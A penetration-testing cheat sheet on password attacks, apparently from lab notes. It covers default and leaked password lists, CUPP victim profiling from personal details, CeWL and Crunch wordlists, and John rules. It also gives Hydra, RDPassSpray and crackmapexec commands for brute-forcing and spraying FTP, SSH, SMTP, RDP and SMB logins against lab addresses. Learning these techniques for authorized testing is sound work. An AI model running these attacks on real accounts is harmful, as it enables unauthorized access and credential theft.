# Crack them all

## Table of contents

##### ➤ Existing dictionnaries and password lists

* [1. Default passwords](#default-passwords)
* [2. Common dictionnaries](#common-dictionnaries)

##### ➤ Wordlist generator

* [0. Basic wordlist creation commands](#basic-wordlist-creation-commands)
* [1. Generate username list using username_generator](#generate-username-list-using-username-generator)
* [2. CUPP - Common User Password Profiler](#cupp---common-user-password-profiler)
* [3. Generate wordlist based on website content](#generate-wordlist-based-on-website-content)
* [4. Generate passwords list using Crunch](#generate-passwords-list-using-crunch)
* [5. Generate passwords list using John](#generate-passwords-list-using-john) 

##### ➤ Online cracking databases

* [1. Online cracking databases](#online-cracking-databases)


##### ➤ Bruteforcing and spraying attacks on common services

* [1. FTP (port 21)](#ftp-port-21)
* [2. SSH (port 22)](#ssh-port-22)
* [3. SMTP (port 25 - 465)](#smtp-port-25---465)
* [4. RDP (port 3389)](#rdp-port-3389)
* [5. SMB (port 139 - 445)](#smb-port-139---445)
* [6. Web login page](#web-login-page)
* [7. Outlook web access (OWA) portal](#outlook-web-access-owa-portal)

# 
# ⭕ Existing dictionnaries and password lists


## 🔻Default passwords

| URL | Description |
| --- | --- |
| https://cirt.net/passwords | |
| https://default-password.info/ | |
| https://datarecovery.com/rd/default-passwords/ | |


## 🔻Common dictionnaries

#### Weak password

| URL | Description |
| --- | --- |
| https://wiki.skullsecurity.org/index.php?title=Passwords | This includes the most well-known collections of passwords. |
|SecLists | A huge collection of all kinds of lists, not only for password cracking. |

#### Leak password

| URL | Description |
| --- | --- |
| https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases | |


# 
# ⭕ Wordlist generator


## 🔻Basic wordlist creation commands
```
#Combined multiples password list
kiosec@cyberlab$  cat file1.txt file2.txt file3.txt > combined_list.txt

#Clean up the generated combined list to remove duplicated words
kiosec@cyberlab$  sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```


## 🔻Generate username list using username_generator
```
kiosec@cyberlab$ git clone https://github.com/therodri2/username_generator.git
<...>

kiosec@cyberlab$ cd username_generator

kiosec@cyberlab$ echo "John Doe" > users.lst
kiosec@cyberlab$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
doe
j.doe
j-doe
j_doe
j+doe
jdoe
```


## 🔻CUPP - Common User Password Profiler

CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc.

#### Installation
```
kiosec@cyberlab$  git clone https://github.com/Mebus/cupp.git
<...>
```

#### Generate a wordlist based on the user public information
```
kiosec@cyberlab$   python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: 
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to .....txt, counting ..... words.
> Hyperspeed Print? (Y/n)
```

#### Generate a wordlist based on the categories
```
kiosec@cyberlab$  python3 cupp.py -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

> Enter number:
Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing!

Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option. 
```

#### Parse default usernames and passwords directly from Alecto DB.
```
kiosec@cyberlab$  python3 cupp.py -a
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt
[+] Done.
```


## 🔻Generate wordlist based on website content
```
#Generate a list based on website 
-w will write the contents to a file. In this case, list.txt.
-m 5 gathers strings (words) that are 5 characters or more
-d 5 is the depth level of web crawling/spidering (default 2)

kiosec@cyberlab$  cewl -w list.txt -d 5 -m 5 http://mycyberlab.com
```


## 🔻Generate passwords list using Crunch
```
#Definition
@ - lower case alpha characters
, - upper case alpha characters
% - numeric characters
^ - special characters including space
2 - the first number is the minimum length of the generated password
2 - the second number is the maximum length of the generated password
01234abc - is the character set to use to generate the passwords
-o list.txt - saves the output to the 3digits.txt file

#Example 01:
kiosec@cyberlab$  crunch 2 2 01234abcd -o crunch.txt
kiosec@cyberlab$ cat crunch.txt
00
..
dd

#Example 02:
kiosec@cyberlab$  crunch 6 6 -t pass%%
pass00
pass01
pass02
pass03
<...>
```


## 🔻Generate passwords list using John

#### Display all rules based
```
#The rules are location into /etc/john/john.conf or /opt/john/john.conf
kiosec@cyberlab$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9
```

#### Applied a john' rules base on an existing wordlist
```
#Create a wordlist with only one password and expand it using a john rule based
--wordlist : to specify the wordlist or dictionary file. 
--rules : to specify which rule or rules to use.
--stdout : to print the output to the terminal.

kiosec@cyberlab$ john --wordlist=/tmp/my-single-password-list.txt --rules=KoreLogic --stdout
<...>
```

#### Create a new john' rules base
```
WIP
```


# 
# ⭕ Online cracking databases

## 🔻Online cracking databases

| URL | Description |
| --- | --- |
| https://crackstation.net/ | |
| https://ntlm.pw/ | |



# 
# ⭕ Bruteforce common services


## 🔻FTP (port 21)

#### FTP password bruteforce using Hydra
```
#Details :
# -l : ftp we are specifying a single username, use-L for a username wordlist
# -P : Path specifying the full path of wordlist, you can specify a single password by using -p.
# ftp://10.10.x.x : the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

Example of default password list :
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt


## 🔻SSH (port 22)

#### SSH password brutefrocing using Hydra
```
hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
```

#### SSH password spraying using Hydra

➤ Using Hydra
```
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10

[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.
```


## 🔻SMTP (port 25 - 465)

#### SMTP password bruteforce using Hydra
```
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```


💥**Important note:** For 465 port
```
hydra -l pittman@clinic.thmredteam.com -P clinic.lst smtp://10.10.216.137:465 -v 
```


## 🔻RDP (port 3389)

#### RDP password spraying

➤ Using RDPPassSpray
```
Url : https://github.com/xFreed0m/RDPassSpray

Install
pip3 install -r requirements.txt
apt-get install python-apt
apt-get install xfreerdp

Basic usage :
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]

kiosec@cyberlab$:~# python3 RDPassSpray.py -U usernames-list.txt -p testPassword -d myCyberlab -T RDP_servers.txt
```


## 🔻SMB (port 139 - 445)

crackmapexec winrm 10.0.0.1 -u kiosec -p passwordlist.txt

Tool: Metasploit (auxiliary/scanner/smb/smb_login)


## 🔻Web login page


## 🔻Outlook web access (OWA) portal

https://github.com/byt3bl33d3r/SprayingToolkit
(atomizer.py)
https://github.com/dafthack/MailSniper
